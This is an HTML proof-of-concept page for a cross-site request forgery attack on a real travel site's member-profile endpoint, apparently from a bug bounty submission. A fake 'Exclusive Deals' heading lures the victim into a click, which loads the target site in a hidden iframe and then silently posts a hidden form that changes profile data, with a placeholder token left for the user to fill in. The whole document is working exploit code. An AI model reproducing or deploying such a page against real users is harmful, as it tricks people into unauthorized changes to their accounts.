<html>
<body>
  <h1 style="cursor:pointer" onclick="submitForm()">Click to View Exclusive Deals!</h1>

  <form id="csrfForm" 
        action="https://www.tripadvisor.com/ModuleAjax" 
        method="POST"
        enctype="application/x-www-form-urlencoded"
        style="display:none">
    
    <!-- Static token (if validation is bypassed) -->
    <input type="hidden" name="actions" value='[{"params":{"firstname":"ziadbugcrowd"...}}]'>
    <input type="hidden" name="context" value='{"modules.membercenter...}'>
    <input type="hidden" name="authenticator" value="Random">
    <input type="hidden" name="version" value="5">
    <input type="hidden" name="token" value="STATIC_TOKEN"> <!-- Replace with valid token -->
  </form>

  <script>
    function submitForm() {
      // Use iframe to establish security context
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = 'https://www.tripadvisor.com';
      
      iframe.onload = () => {
        document.getElementById('csrfForm').submit();
      };
      
      document.body.appendChild(iframe);
    }
  </script>
</body>
</html>
